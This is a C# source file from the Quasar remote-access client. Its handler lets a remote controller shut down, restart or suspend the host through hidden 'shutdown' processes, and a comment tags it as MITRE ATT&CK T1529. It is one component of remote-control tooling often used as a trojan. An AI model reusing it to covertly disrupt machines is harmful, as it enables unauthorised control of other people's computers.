using Quasar.Common.Enums;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class ShutdownHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoShutdownAction;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShutdownAction msg:
                    Execute(sender, msg);
                    break;
            }
        }

        /// <summary>
        /// Executes the DoShutdownAction request to shutdown, suspend, or restart the computer.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1529: System Shutdown/Reboot
        /// </remarks>
        private void Execute(ISender client, DoShutdownAction message)
        {
            Logger.Debug("Handling DoShutdownAction request.");
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (message.Action)
                {
                    case ShutdownAction.Shutdown:
                        Logger.Info("Shutting down the computer.");
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Restart:
                        Logger.Info("Restarting the computer.");
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Standby:
                        Logger.Info("Suspending the computer.");
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Exception when handling DoShutdownAction request: " + ex.ToString());
                client.Send(new SetStatus { Message = $"Action failed: {ex.Message}" });
            }
        }
    }
}
